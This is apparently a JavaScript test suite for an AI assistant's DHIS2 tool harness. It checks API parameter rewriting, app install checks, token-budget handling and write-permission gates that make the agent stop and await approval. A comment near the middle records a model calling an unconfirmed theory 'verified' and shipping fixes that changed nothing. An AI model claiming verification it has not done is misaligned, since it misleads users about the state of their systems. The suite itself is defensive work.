  truthy('a long multi-part request gets more look-ups than a short one', (() => { const f = vm.runInContext('discoveryStreakLimit', ctx); vm.runInContext('lastUserText = "short"', ctx); const a = f(); vm.runInContext(`lastUserText = ${JSON.stringify('x'.repeat(900))}`, ctx); const b = f(); vm.runInContext('lastUserText = ""', ctx); return a === 12 && b === 20; })());
  truthy('a dashboard description over 255 characters is shortened, not refused', (() => { const t = ctx.dashboardTextMarkup; const out = ctx.clampDashboardDescription('Measures describe recorded events. '.repeat(12)); return out.length <= 255 && out.endsWith('…') && ctx.clampDashboardDescription('short') === 'short'; })());
  {
    const saved = ctx.safeDhis2Fetch; const d = vm.runInContext('dhis2', ctx);
    ctx.safeDhis2Fetch = async (p) => (/^organisationUnitLevels/.test(p) ? { organisationUnitLevels: [{ level: 2, displayName: 'District' }, { level: 3, displayName: 'Chiefdom' }, { level: 4, displayName: 'Facility' }] } : {});
    d.orgLevelNames = null;
    try {
      const w = ctx.orgLevelNameWarning;
      truthy('a title saying district on level 3 (Chiefdom) is flagged', /level 2 on this server/.test(await w('Stockout % by district, 2026', ['ImspTQPwCqd'], 3) || ''));
      truthy('…the same through LEVEL-3', /Chiefdom/.test(await w('Testing by District', ['LEVEL-3']) || ''));
      truthy('…a plural name is matched', /level 4 on this server/.test(await w('Events by facilities', ['LEVEL-2']) || ''));
      truthy('…the right level is not', await w('Stockout % by district', [], 2) === null);
      truthy('…a facility map with district outlines in its title is not', await w('Facility events with district outlines', [], 4) === null);
      truthy('…no level or no level name is not', await w('Stockout by district', ['ImspTQPwCqd']) === null && await w('Stockout map', [], 3) === null);
    } finally { ctx.safeDhis2Fetch = saved; d.orgLevelNames = null; }
    const fine = ctx.buildMapObject({ name: 'M', data_item: 'piA00000000', org_unit_level: 2, boundary_level: 3, period: '2026' }, typeMap);
    truthy('finer outlines on a shaded map are left out and reported', fine.map.mapViews.length === 1 && /left out/.test(fine.boundaryNote || ''));
    const coarse = ctx.buildMapObject({ name: 'M', data_item: 'piA00000000', org_unit_level: 4, boundary_level: 2, thematic_map_type: 'BUBBLE', period: '2026' }, typeMap);
    truthy('district outlines under a facility bubble map stay', coarse.map.mapViews.length === 2 && !coarse.boundaryNote);
  }
  {
    const saved = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => (/^visualizations\?filter=dataDimensionItems\.programIndicator/.test(p) ? { visualizations: [{ id: 'v1', name: 'Chart' }] } : /^maps\?/.test(p) ? { maps: [{ id: 'm1', name: 'Map' }] } : {});
    try {
      const used = await ctx.savedOutputsUsingDataItem('programIndicator', 'pi1');
      truthy('the charts and maps plotting an indicator are found', used.length === 2 && used[0].type === 'chart' && used[1].type === 'map');
      truthy('…deleting it is refused with their names', /Chart/.test(ctx.dataItemInUseRefusal('x', used)._error));
      const r = await ctx.checkMetadataReferences('programIndicators', 'pi1');
      truthy('…manage_metadata sees them as references too', r.has_references === true);
    } finally { ctx.safeDhis2Fetch = saved; }
  }

  truthy('a refusal\'s redirect goes on the wire', (() => { const s = vm.runInContext('_runAgenticLoopInner.toString()', ctx); return /toolResult\._redirect/.test(s) && /wireTools\.push\(\.\.\.toWireTools\(\[offered\]\)\)/.test(s); })());
  const refs = ctx.safeDhis2Fetch;
  ctx.safeDhis2Fetch = async (p) => (/^dashboards\?filter=dashboardItems\.visualization\.id/.test(p) ? { dashboards: [{ id: 'd1', name: 'Dash' }] } : {});
  try {
    const r = await ctx.checkMetadataReferences('visualizations', 'v1');
    truthy('a chart on a dashboard has a reference, so manage_metadata will not silently remove its tile', r.has_references === true && /remove that tile/.test(ctx.buildDeletionHint('visualizations', 'v1', r.references)));
  } finally { ctx.safeDhis2Fetch = refs; }
}

// ── ANC Follow-up Explorer thread (2026-11-03, play 2.42.7) ───────────────────
// An app sent orgUnit= to tracker/enrollments (400) and enrollment= to tracker/events
// (ignored: other registrations' events). This assistant's own prompt taught the first.
// The model could not see the app run, called a wrong theory "verified", and shipped
// two fixes that changed nothing. Installing took three extra rounds, a wrong URL and
// a token limit the user had to raise by hand.
async function runAncAppThreadChecks() {
  console.log('\nANC app thread (tracker parameter names, install check, install intent, own-app repair, token budget):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const n = (s, v = 42) => ctx.normalizeTrackerQuery(s, v);
  truthy('enrollments: orgUnit → orgUnits', n('tracker/enrollments?program=p&orgUnit=a&orgUnitMode=DESCENDANTS') === 'tracker/enrollments?program=p&orgUnits=a&orgUnitMode=DESCENDANTS');
  truthy('trackedEntities: orgUnit → orgUnits', /orgUnits=a/.test(n('tracker/trackedEntities?orgUnit=a&orgUnitMode=DESCENDANTS')));
  truthy('events: orgUnits → orgUnit', n('tracker/events?orgUnits=a&orgUnitMode=DESCENDANTS') === 'tracker/events?orgUnit=a&orgUnitMode=DESCENDANTS');
  truthy('events: enrollment → enrollments (the name that leaked other registrations)', n('tracker/events?program=p&enrollment=e') === 'tracker/events?program=p&enrollments=e');
  truthy('ouMode → orgUnitMode everywhere', ['enrollments', 'events', 'trackedEntities'].every(k => /orgUnitMode=DESCENDANTS/.test(n(`tracker/${k}?ouMode=DESCENDANTS&${k === 'events' ? 'orgUnit' : 'orgUnits'}=a`))));
  truthy('enrollments: programStartDate/EndDate → enrolledAfter/Before', n('tracker/enrollments?programStartDate=2026-01-01&programEndDate=2026-12-31') === 'tracker/enrollments?enrolledAfter=2026-01-01&enrolledBefore=2026-12-31');
  truthy('trackedEntities: programStartDate → enrollmentEnrolledAfter, trackedEntity → trackedEntities', n('tracker/trackedEntities?programStartDate=2026-01-01&trackedEntity=t') === 'tracker/trackedEntities?enrollmentEnrolledAfter=2026-01-01&trackedEntities=t');
  truthy('events: startDate, eventStatus, stage', n('tracker/events?startDate=a&endDate=b&eventStatus=COMPLETED&stage=s') === 'tracker/events?occurredAfter=a&occurredBefore=b&status=COMPLETED&programStage=s');
  truthy('orgUnits a;b → a,b', n('tracker/enrollments?orgUnits=a;b&orgUnitMode=DESCENDANTS') === 'tracker/enrollments?orgUnits=a,b&orgUnitMode=DESCENDANTS');
  truthy('USER_ORGUNIT is not an id: it becomes the capture mode', n('tracker/enrollments?orgUnit=USER_ORGUNIT&orgUnitMode=DESCENDANTS') === 'tracker/enrollments?orgUnitMode=CAPTURE');
  truthy('a mode that needs an org unit, with none: every record the viewer can reach', n('tracker/events?orgUnitMode=DESCENDANTS&program=p') === 'tracker/events?orgUnitMode=ACCESSIBLE&program=p');
  truthy('an empty org unit counts as none', n('tracker/enrollments?orgUnit=&orgUnitMode=SELECTED') === 'tracker/enrollments?orgUnitMode=ACCESSIBLE');
  truthy('the right name beats a wrong one sent with it', n('tracker/enrollments?orgUnit=a&orgUnits=b&orgUnitMode=DESCENDANTS') === 'tracker/enrollments?orgUnits=b&orgUnitMode=DESCENDANTS');
  truthy('correct requests come back unchanged', ['tracker/enrollments?program=p&orgUnits=a&orgUnitMode=DESCENDANTS&enrolledAfter=2026-01-01&page=2', 'tracker/events?program=p&enrollments=e&paging=false', 'tracker/events?program=p&orgUnit=a&orgUnitMode=DESCENDANTS'].every(s => n(s) === s));
  truthy('a full URL works, and other paths are left alone', n('https://x.org/api/42/tracker/enrollments?orgUnit=a&orgUnitMode=ALL') === 'https://x.org/api/42/tracker/enrollments?orgUnits=a&orgUnitMode=ALL' && n('programs?orgUnit=a') === 'programs?orgUnit=a' && n('tracker/enrollments/abc?orgUnit=a') === 'tracker/enrollments/abc?orgUnit=a');
  truthy('2.40 keeps its own names', n('tracker/enrollments?orgUnit=a&ouMode=DESCENDANTS', 40) === 'tracker/enrollments?orgUnit=a&ouMode=DESCENDANTS');

  const closed = ctx.customAppRecordsClosed;
  truthy('install check: a tracker list asks for an empty window', ['enrollments', 'events', 'trackedEntities'].every(k => /updatedAfter=2099-01-01$/.test(closed(`/api/42/tracker/${k}?program=p`))));
  truthy('…one record, SQL-view rows and old record endpoints are not sent', closed('/api/tracker/enrollments/abcdefghijk?fields=x') === null && closed('/api/sqlViews/abcdefghijk/data') === null && closed('/api/42/events?program=p') === null);
  truthy('…row-level analytics adds skipData; metadata and aggregates pass', /skipData=true/.test(closed('/api/analytics/events/query/p?x=1')) && closed('/api/programs/p?fields=id') === '/api/programs/p?fields=id' && closed('/api/analytics?dimension=dx:a') === '/api/analytics?dimension=dx:a');

  {
    const dv = vm.runInContext('dhis2', ctx);
    const savedVersion = dv.apiVersion;
    dv.apiVersion = 42;
    const guardSrc = ctx.buildCustomAppGuardJs({ needsWriteAccess: false });
    dv.apiVersion = savedVersion;
    const calls = [];
    const win = { location: { origin: 'https://d.org', href: 'https://d.org/api/apps/x/index.html', search: '' }, fetch: (u) => { calls.push(String(u)); return Promise.resolve({ ok: true, status: 200 }); } };
    win.XMLHttpRequest = function () {}; win.XMLHttpRequest.prototype.open = function (m, u) { calls.push(`xhr ${u}`); };
    vm.runInNewContext(guardSrc, { window: win, navigator: {}, console: { error() {} }, URL, Promise, Error, String, Object, Number, Array, RegExp, Math, JSON });
    await win.fetch('/api/42/tracker/enrollments?program=p&orgUnit=a&orgUnitMode=DESCENDANTS');
    new win.XMLHttpRequest().open('GET', '/api/tracker/events?enrollment=e');
    truthy('a generated app\'s guard corrects the names, on fetch and on XHR', /orgUnits=a/.test(calls[0]) && /enrollments=e/.test(calls[1]));
    // Malaria follow-up board (2026-11-08): filter=<stage>.<de>:EQ:true → 409 "Expression violation".
    await win.fetch('/api/42/analytics/events/aggregate/p?dimension=ou%3AUSER_ORGUNIT%3BLEVEL-4,pe%3ALAST_12_MONTHS&filter=zxoz9E7n5pQ.wMlwu72FPuz%3AEQ%3Atrue&stage=zxoz9E7n5pQ');
    new win.XMLHttpRequest().open('GET', '/api/analytics/enrollments/query/p?dimension=A.B:IN:true;false');
    truthy('…and sends a Yes/No analytics filter as 1/0, on fetch and on XHR', /filter=zxoz9E7n5pQ\.wMlwu72FPuz%3AEQ%3A1(&|$)/.test(calls[2]) && /dimension=A\.B%3AIN%3A1%3B0/.test(calls[3]));
    truthy('…and an ordinary open is not in check mode', !win.__aiAppCheck && !/updatedAfter=2099/.test(calls[0]));
    const checkCalls = [];
    const listeners = [];
    const cw = { location: { origin: 'https://d.org', href: 'https://d.org/api/apps/x/index.html?__ai_check=1', search: '?redirect=false&__ai_check=1' }, addEventListener: (t, f) => listeners.push([t, f]), fetch: (u) => { checkCalls.push(String(u)); return Promise.resolve({ ok: false, status: 400, clone() { return { text: () => Promise.resolve('{"message":"At least one org unit"}') }; } }); } };
    cw.XMLHttpRequest = function () {}; cw.XMLHttpRequest.prototype.open = function () {};
    class FakeResponse { constructor(b, o) { this.status = o.status; this.ok = false; } }
    const cons = { error() {} };
    vm.runInNewContext(guardSrc.replace('var READ_ONLY = true', 'var READ_ONLY = false'), { window: cw, navigator: {}, console: cons, URL, Promise, Error, String, Object, Number, Array, RegExp, Math, JSON, Response: FakeResponse, Request: function () {} });
    await cw.fetch('/api/42/tracker/enrollments?program=p&orgUnits=a&orgUnitMode=DESCENDANTS');
    await new Promise(r => setImmediate(r));
    const one = await cw.fetch('/api/42/tracker/enrollments/abcdefghijk');
    const blocked = await cw.fetch('/api/dataStore/x/y', { method: 'POST' }).then(() => 'sent', () => 'blocked');
    const L = cw.__aiAppCheck;
    truthy('check mode: the list goes out with the empty window, and its status and DHIS2 message are logged', checkCalls.length === 1 && /updatedAfter=2099-01-01/.test(checkCalls[0]) && L.requests[0].status === 400 && /org unit/.test(L.requests[0].message));
    truthy('…a single record is not sent, a write is refused', one.status === 404 && L.notOpened.length === 1 && blocked === 'blocked' && L.blockedWrites.length === 1 && checkCalls.length === 1);
    cons.error('boom');
    truthy('…script errors are logged', L.errors.some(e => /boom/.test(e)));
  }

  const asked = ctx.userAskedToInstall;
  truthy('"Give me the finished app URL" asks for an installed app', asked('Create an app called X. Give me the finished app URL and explain what needs testing.'));
  truthy('…"the link to the app", "install it"', asked('send me the link to the app') && asked('install it'));
  truthy('…a plain "create an app", or "preview first", does not', !asked('Create an app called X') && !asked('Show me a preview first, then the finished app') && !asked('do not install it'));
  {
    // Final round 2026-11-10: "Add a widget to this enrollment dashboard" was previewed and then told to stop and ask.
    const savedHist2 = vm.runInContext('conversationHistory', ctx);
    const next = async (said) => {
      vm.runInContext(`conversationHistory = []; lastUserText = ${JSON.stringify(said)};`, ctx);
      const r = await ctx.executeManageCustomApp({ action: 'preview', name: 'Vx widget', key: 'ai-vx-widget', kind: 'plugin', plugin_type: 'CAPTURE', datastore_namespace: false, files: { 'plugin.jsx': "const { useState, useEffect } = React;\nfunction P() { const [p, setP] = useState(null); useEffect(() => { postRobot.send(window.parent, 'getPropsFromParent').then((e) => setP(e.data)); }, []); useEffect(() => { if (p && p.setPluginHeight) p.setPluginHeight(document.getElementById('root').getBoundingClientRect().height); }); return <div>{p ? String(p.enrollmentId || '') : ''}</div>; }\nReactDOMClient.createRoot(document.getElementById('root')).render(<P />);" } });
      return r;
    };
    const placeAsk = await next('Add a widget to this enrollment dashboard that shows the visits');
    const firstAsk = await next('Show me a preview first, then add a widget to this enrollment dashboard');
    const plainAsk = await next('Build a widget that shows the visits');
    truthy('a preview tells the model to install now when the user asked for the plugin in a place, and to stop and ask otherwise',
      placeAsk.preview && /now, in this turn/.test(placeAsk.next_step) && !placeAsk._awaiting_approval
      && firstAsk.preview && /STOP here for this turn/.test(firstAsk.next_step) && firstAsk._awaiting_approval === true
      && plainAsk.preview && /STOP here for this turn/.test(plainAsk.next_step) && plainAsk._awaiting_approval === true, JSON.stringify([placeAsk._error, placeAsk.next_step, firstAsk.next_step]).slice(0, 400));
    vm.runInContext(`lastUserText = ""; conversationHistory = ${JSON.stringify(savedHist2 || [])};`, ctx);
  }
  {
    const savedHist = vm.runInContext('conversationHistory', ctx);
    vm.runInContext(`conversationHistory = [{ role: 'user', content: 'Create an app called X for Y with many parts. Give me the finished app URL when done.' }, { role: 'assistant', content: 'ok' }]; lastUserText = 'I increased the max tokens, continue';`, ctx);
    truthy('"…, continue" keeps the install intent of the request it continues', asked(ctx.installIntentText()));
    vm.runInContext(`lastUserText = 'getting this error'`, ctx);
    truthy('…an unrelated short message does not inherit it', !asked(ctx.installIntentText()));
    vm.runInContext('lastUserText = ""', ctx);
    vm.runInContext(`conversationHistory = ${JSON.stringify(savedHist || [])}`, ctx);
  }

  truthy('the own-app repair gate compares write access with the manifest\'s needs_write_access (apps that write were never let through)',
    /!!spec\.needsWriteAccess === !!base\.needs_write_access/.test(fs.readFileSync(path.join(ROOT, 'src/tools-apps.js'), 'utf8')));
  const repair = ctx.ownAppRepairAllowed;
  const own = { own_app_same_access: true };
  truthy('repairing its own app: allowed on an error report, in a turn that approved something else, and in a broad turn',
    repair('manage_custom_app', 'update', own, { scope: 'read_only', reason: 'user reported a problem — diagnose first' }) && repair('manage_custom_app', 'update', own, { scope: 'scoped' }) && repair('manage_custom_app', 'update', own, { scope: 'broad' }));
  truthy('…not when the user said to change nothing, not on a plain question',
    !repair('manage_custom_app', 'update', own, { scope: 'read_only', reason: 'the user asked for no changes (explain / read-only)' }) && !repair('manage_custom_app', 'update', own, { scope: 'read_only', reason: 'no explicit write authorization detected' }));
  truthy('…not another app, a change of write access, another action or another tool',
    !repair('manage_custom_app', 'update', { own_app_same_access: false }, { scope: 'scoped' }) && !repair('manage_custom_app', 'delete', own, { scope: 'scoped' }) && !repair('manage_maps', 'update', own, { scope: 'scoped' }));

  {
    const d = vm.runInContext('dhis2', ctx);
    const was = d.raisedMaxTokens;
    d.raisedMaxTokens = 0;
    const effective = vm.runInContext('effectiveMaxTokens', ctx);
    const raise = vm.runInContext('raiseMaxTokensAfterCut', ctx);
    const refused = vm.runInContext('providerRefusedMaxTokens', ctx);
    truthy('a cut doubles the budget, up to a ceiling, and stops raising there', effective({ maxTokens: 16384 }) === 16384 && raise({ maxTokens: 16384 }) === 32768 && effective({ maxTokens: 16384 }) === 32768 && raise({ maxTokens: 16384 }) === 64000 && raise({ maxTokens: 16384 }) === 0);
    d.raisedMaxTokens = 0;
    truthy('…a user setting above it stands', effective({ maxTokens: 100000 }) === 100000 && raise({ maxTokens: 100000 }) === 0);
    truthy('…a provider refusing the number is recognised', refused(400, { error: { message: 'max_tokens is too large' } }) && !refused(400, { error: { message: 'bad model' } }) && !refused(500, { message: 'max_tokens' }));
    d.raisedMaxTokens = was;
  }

  const prompt = vm.runInContext('TOOLS', ctx);
  {
    const applyEdits = ctx.applyCustomAppEdits;
    const src = { 'app.jsx': 'const a = 1;\nconst b = 2;\nconst c = 1;' };
    truthy('update edits: an exact, unique find is replaced', applyEdits(src, [{ file: 'src/app.jsx', find: 'const b = 2;', replace: 'const b = 3;' }]).ok && /const b = 3;/.test(src['app.jsx']));
    const copy = { 'app.jsx': 'x y x' };
    const miss = applyEdits(copy, [{ file: 'app.jsx', find: 'y', replace: 'z' }, { file: 'app.jsx', find: 'x', replace: 'w' }]);
    truthy('…a find that matches twice refuses, and nothing is changed (all or nothing)', /occurs 2 times/.test(miss._error || '') && copy['app.jsx'] === 'x y x');
    truthy('…no match, an unknown file and a malformed edit are refused', /occurs 0 times/.test(applyEdits(copy, [{ file: 'app.jsx', find: 'q', replace: 'r' }])._error || '') && /no file/.test(applyEdits(copy, [{ file: 'nope.jsx', find: 'x', replace: 'r' }])._error || '') && /needs file/.test(applyEdits(copy, [{ file: 'app.jsx' }])._error || ''));
    truthy('…no edits at all is fine', applyEdits(copy, undefined).ok === true);
    const d2 = vm.runInContext('dhis2', ctx);
    const wasR = d2.raisedMaxTokens; const wasF = d2.maxTokensRefused;
    d2.raisedMaxTokens = 0; d2.maxTokensRefused = true;
    truthy('a provider that refused a higher budget is not asked again (no endless cut and refusal)', vm.runInContext('raiseMaxTokensAfterCut', ctx)({ maxTokens: 16384 }) === 0);
    d2.raisedMaxTokens = wasR; d2.maxTokensRefused = wasF;
  }
  const uids = ctx.extractCustomAppUids;
  truthy('a variable named like an id is not an id, even after a regex with a quote', uids({ 'app.js': `const facilitiesQ = { a: 1 }; const r = /"/g; useDataQuery(facilitiesQ); const s = 'x'; const t = "y";` }).length === 0);
  truthy('…a real id in a string still is', uids({ 'app.js': `const PROGRAM = 'WSGAb5XwJ3Y';` }).includes('WSGAb5XwJ3Y'));
  const allDocs = JSON.stringify(prompt) + vm.runInContext('KB_CUSTOM_APPS_DETAILS', ctx);
  truthy('the prompt no longer teaches orgUnit on tracker/enrollments or tracker/trackedEntities', !/tracker\/(?:enrollments|trackedEntities)\?program=\{id\}&orgUnit=/.test(vm.runInContext('buildSystemPrompt.toString()', ctx) + allDocs));
  truthy('the app manual gives the parameter table, the timeline recipe and the install check', /enrollments \(PLURAL\)/.test(allDocs) && /ONE REGISTRATION'S WHOLE TIMELINE/.test(allDocs) && /D2_SELF_TEST/.test(allDocs) && /Install check/.test(allDocs));
}

// ── Real-model round of 2026-11-13: Data Quality Workbench app, Facility
//    Supervision event program, Monthly Malaria Report data set, TB tracker widget ──
async function runDataQualityThreadChecks() {
  console.log('\nData quality / supervision / malaria-report threads (endpoint-scoped stops, data-quality endpoints, reporting rates and categories on charts, tiles per row, harness outcomes):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = vm.runInContext('dhis2', ctx);
  const saved = { sdf: ctx.safeDhis2Fetch, wa: d.writeAuth, n: d.httpErrorCount, h: d.httpErrorHistory, f: d.failedCallSigs, fam: d.toolErrorFamilies, base: d.baseUrl, connected: d.connected };
  Object.assign(d, { baseUrl: d.baseUrl || 'https://verify.example/dhis', connected: true });
  try {
    // 1. One wrong endpoint does not close the others.
    const tgt = ctx.dhis2QueryTarget;
    truthy('a dhis2_query call is identified by its method and endpoint: ids, queries, the /api/<v>/ prefix and a full URL do not change it',
      tgt({ path: 'validation?vrg=a&ou=b' }) === 'GET validation' && tgt({ path: '/api/42/dataElements/fbfJHSPpUQD?fields=id' }) === 'GET dataelements'
      && tgt({ path: 'https://play.example/stable/api/analytics/events/query/IpHINAT79UW?stage=x' }) === 'GET analytics/events' && tgt({ method: 'post', path: 'dataAnalysis/validationRules' }) === 'POST dataanalysis/validationrules'
      && tgt({ path: 'analytics?dimension=dx:a' }) === 'GET analytics' && tgt({ path: 'tracker/events?program=x' }) === 'GET tracker/events');
    d.failedCallSigs = new Map(); d.toolErrorFamilies = new Map(); d.httpErrorCount = 0; d.httpErrorHistory = [];
    const e404 = { _error: 'DHIS2 API 404', _status: 404 };
    ['validation?vrg=a', 'validation/analysis?vrg=a', 'validation', 'validation?x=1'].forEach((path) => ctx.noteToolFailure('dhis2_query', { path }, e404));
    const again = ctx.repeatedFailureStopOrNull('dhis2_query', { path: 'validation?y=2' });
    const other = ctx.repeatedFailureStopOrNull('dhis2_query', { path: 'analytics?dimension=dx:fbfJHSPpUQD&dimension=pe:LAST_12_MONTHS' });
    truthy('four 404s on guessed validation paths stop more validation calls, naming the endpoint and saying the others still work; a correct analytics query is not refused',
      again && again._scope === 'same_error_family_limit' && /GET validation/.test(again._error) && /every other endpoint/.test(again._hint) && other === null);
    ['a', 'b', 'c', 'd'].forEach((n) => ctx.noteToolFailure('manage_maps', { action: 'create', name: n }, { _error: 'DHIS2 API 409: no' }));
    const maps = ctx.repeatedFailureStopOrNull('manage_maps', { action: 'create', name: 'e' });
    truthy('…a tool with actions is stopped as before', maps && /Do NOT call manage_maps again/.test(maps._hint));

    // 2. Data-quality endpoints: the guess is answered, the real ones go out.
    const calls = [];
    ctx.safeDhis2Fetch = async (p, o = {}) => { calls.push(`${(o && o.method) || 'GET'} ${p}`); return /^nonsense/.test(p) ? { _error: 'DHIS2 API 404', _status: 404, _url: 'x' } : /^dataElements\/abcdefghij1/.test(p) ? { _error: 'DHIS2 API 404: DataElement with id abcdefghij1 could not be found.', _status: 404, _body: { message: 'x' } } : /^identifiableObjects/.test(p) ? { _error: 'DHIS2 API 404', _status: 404 } : []; };
    d.writeAuth = { scope: 'read_only', reason: 'verify' };
    const g1 = await ctx.executeTool('dhis2_query', { path: 'validation', query_params: { vrg: 'UiOSY1iIdub', ou: 'ImspTQPwCqd', pe: '2024' } });
    const g2 = await ctx.executeTool('dhis2_query', { path: 'validation/analysis', method: 'POST', body: {} });
    truthy('GET validation and POST validation/analysis are answered with the endpoints that exist, on a read-only turn too, and nothing is sent',
      g1._scope === 'known_endpoint_guidance' && /POST dataAnalysis\/validationRules/.test(g1._hint) && /outlierDetection/.test(g1._hint)
      && g2._scope === 'known_endpoint_guidance' && calls.length === 0);
    const re = vm.runInContext('GUESSED_DATA_QUALITY_PATH_RE', ctx);
    truthy('…the real endpoints are not taken for guesses',
      ['validation/dataSet/BfMAe6Itzgt', 'outlierDetection', 'analytics/outlierDetection', 'dataAnalysis/validationRules', 'validationRules', 'validationResults', 'validationRuleGroups'].every((x) => !re.test(x))
      && ['validation', 'validation/analysis', 'dataQuality', 'outliers', 'analytics/outliers', 'dataAnalysis'].every((x) => re.test(x)));
    const run = await ctx.executeTool('dhis2_query', { path: 'dataAnalysis/validationRules', method: 'POST', body: { ou: 'ImspTQPwCqd', startDate: '2025-01-01', endDate: '2025-01-31', notification: false, persist: false } });
    const persist = await ctx.executeTool('dhis2_query', { path: 'dataAnalysis/validationRules', method: 'POST', body: { ou: 'ImspTQPwCqd', startDate: '2025-01-01', endDate: '2025-01-31', persist: true } });
    truthy('a validation analysis that saves nothing runs on a read-only turn (DHIS2 has no GET for it); with persist:true it is a write and is refused',
      Array.isArray(run) && calls.some((c) => /^POST dataAnalysis\/validationRules/.test(c)) && persist && /write|authoriz|read-only|not authorized|confirm/i.test(JSON.stringify(persist)) && calls.filter((c) => /^POST dataAnalysis/.test(c)).length === 1);
    const none = await ctx.executeTool('dhis2_query', { path: 'nonsenseEndpoint' });
    const missing = await ctx.executeTool('dhis2_query', { path: 'dataElements/abcdefghij1' });
    truthy('a 404 with no JSON body is told as "no such endpoint, do not try other spellings"; a missing object keeps DHIS2\'s own message',
      none._scope === 'no_such_endpoint' && /no GET endpoint at "nonsenseEndpoint"/.test(none._error) && /other spellings/.test(none._hint) && missing._scope !== 'no_such_endpoint' && /could not be found/.test(missing._error));
    truthy('the dhis2_query description and the app manual carry the data-quality endpoints',
      /dataAnalysis\/validationRules/.test(JSON.stringify(vm.runInContext('TOOLS.find(t => t.function.name === "dhis2_query").function.description', ctx))) && /dataAnalysis\/validationRules/.test(vm.runInContext('KB_CUSTOM_APPS_DETAILS', ctx)));

    // 3. The app preview asks the server for each endpoint the code names in full.
    const compiled = { 'app.jsx': [
      "const A = { a: { resource: 'validation', params: { ou: 'x' } } };",
      "const B = { b: { resource: 'analytics/events/aggregate/' + PROGRAM, params: {} } };",
      "const C = { c: { resource: `tracker/enrollments/${id}/note`, type: 'create' } };",
      "const D = { d: { resource: 'dataStore/' + NS + '/k' }, e: { resource: 'dataElements', id: X }, f: { resource: 'dataAnalysis/validationRules', type: 'create', data: {} } };",
    ].join('\n') };
    truthy('only resources written out in full are checked: not a path built with + or a template, nor the dataStore, tracker or an endpoint known to exist',
      JSON.stringify(ctx.customAppStaticResources(compiled).sort()) === JSON.stringify(['dataElements', 'validation']));
    ctx.safeDhis2Fetch = async (p) => (/^validation\?/.test(p) ? { _error: 'DHIS2 API 404', _status: 404 } : /^lockExceptions/.test(p) ? { _error: 'DHIS2 API 405: Request method GET is not supported', _status: 405, _body: {} } : { dataElements: [] });
    compiled['app.jsx'] += "\nconst E = { g: { resource: 'lockExceptions', type: 'create', data: {} } };";
    compiled['app.jsx'] += "\nconst F = { h: { resource: 'analytics/outliers', params: {} }, i: { resource: 'nonsenseThing', params: {} } };";
    const asked = [];
    const sdf0 = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => { asked.push(p.split('?')[0]); return /^nonsenseThing/.test(p) ? { _error: 'DHIS2 API 404', _status: 404 } : sdf0(p); };
    truthy('a path the server answers with a bare 404 is reported, and a known guess without asking; 405 and 200 mean the endpoint exists',
      JSON.stringify(await ctx.checkCustomAppEndpoints(compiled)) === '["analytics/outliers","nonsenseThing","validation"]' && !asked.includes('validation') && !asked.includes('analytics/outliers') && asked.includes('lockExceptions'));

    // 4. Events of one enrollment narrowed by org unit.
    const kitMeta = JSON.parse(fs.readFileSync(path.join(ROOT, 'libs/d2-kit/KIT_VERSION.json'), 'utf8'));
    const lintErr = (src) => ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', src).code }, 'plugin', kitMeta, 'CAPTURE').errors.map((e) => e.message).join(' | ');
    const q = (params) => `const { useDataQuery } = D2Runtime;\nconst Q = { ev: { resource: 'tracker/events', params: ({ enrollment, orgUnit }) => ({ ${params} fields: 'event,occurredAt', paging: false }) } };\nfunction A(props) { const r = useDataQuery(Q, { variables: props }); return null; }`;
    truthy('tracker/events pinned to an enrollment AND an org unit is an error that says to drop the org unit (with or without orgUnitMode), and asks for no orgUnitMode',
      /already pinned to one enrollment/.test(lintErr(q("enrollments: enrollment, orgUnit: orgUnit, orgUnitMode: 'DESCENDANTS',"))) && /already pinned to one enrollment/.test(lintErr(q('enrollments: enrollment, orgUnit: orgUnit,')))
      && !/no orgUnitMode return only/.test(lintErr(q('enrollments: enrollment, orgUnit: orgUnit,'))));
    truthy('…the enrollment alone passes, and an org unit with no enrollment still needs its orgUnitMode',
      !/pinned|orgUnitMode/.test(lintErr(q('enrollments: enrollment,'))) && /no orgUnitMode return only/.test(lintErr(q('orgUnit: orgUnit,'))) && /needs no org unit at all/.test(lintErr(q('orgUnit: orgUnit,'))));

    const writeOnly = `const { useDataEngine, useDataQuery } = D2Runtime;\nconst Q = { ev: { resource: 'tracker/events', params: ({ enrollment }) => ({ enrollments: enrollment, fields: 'event,occurredAt', paging: false }) } };\nfunction A(props) { const engine = useDataEngine(); const r = useDataQuery(Q, { variables: props });\n  const save = () => engine.mutate({ resource: 'tracker', type: 'create', params: { async: 'false' }, data: { events: [{ program: 'fofUFvr9eUY', orgUnit: props.orgUnitId, status: 'SCHEDULE' }] } });\n  return null; }`;
    truthy('the org unit of an event being written is not a read filter: no orgUnitMode is asked for', !/orgUnitMode/.test(lintErr(writeOnly)));
    const appLint = (src) => ctx.lintCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src + "\nReactDOMClient.createRoot(document.getElementById('root')).render(<A />);").code }, 'app', kitMeta).errors.map((e) => e.message).join(' | ');
    const eng = (call) => `const { useDataEngine, Provider } = D2Runtime;\nfunction A() { const engine = useDataEngine(); const run = () => ${call}; return <button onClick={run}>Run</button>; }`;
    truthy('engine.fetch({ resource… }) and other calls the data engine does not have are an error at preview; query and mutate pass',
      /engine\.fetch\(…\) is not part of the data engine/.test(appLint(eng("engine.fetch({ resource: 'outlierDetection', params: { ds: 'x' } }).then((r) => r)")))
      && /engine\.get\(…\) is not part of the data engine/.test(appLint(eng("engine.get('analytics')")))
      && !/not part of the data engine/.test(appLint(eng("engine.query({ o: { resource: 'outlierDetection', params: { ds: 'x' } } }).then((r) => r.o)")))
      && !/not part of the data engine/.test(appLint(eng("engine.mutate({ resource: 'dataAnalysis/validationRules', type: 'create', data: {} })"))));

    const scanOf = (src) => ctx.scanCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }).filter((v) => v.rule.startsWith('write:')).length;
    const va = (data, res = "'dataAnalysis/validationRules'") => `const { useDataEngine } = D2Runtime;\nfunction A() { const engine = useDataEngine(); const run = (ou) => engine.mutate({ resource: ${res}, type: 'create', data: ${data} }); return null; }`;
    truthy('a read-only app may run a validation analysis (engine.mutate on dataAnalysis/validationRules, persist and notification false or absent); with persist:true, a shorthand persist, another resource or a second mutation it is still a write',
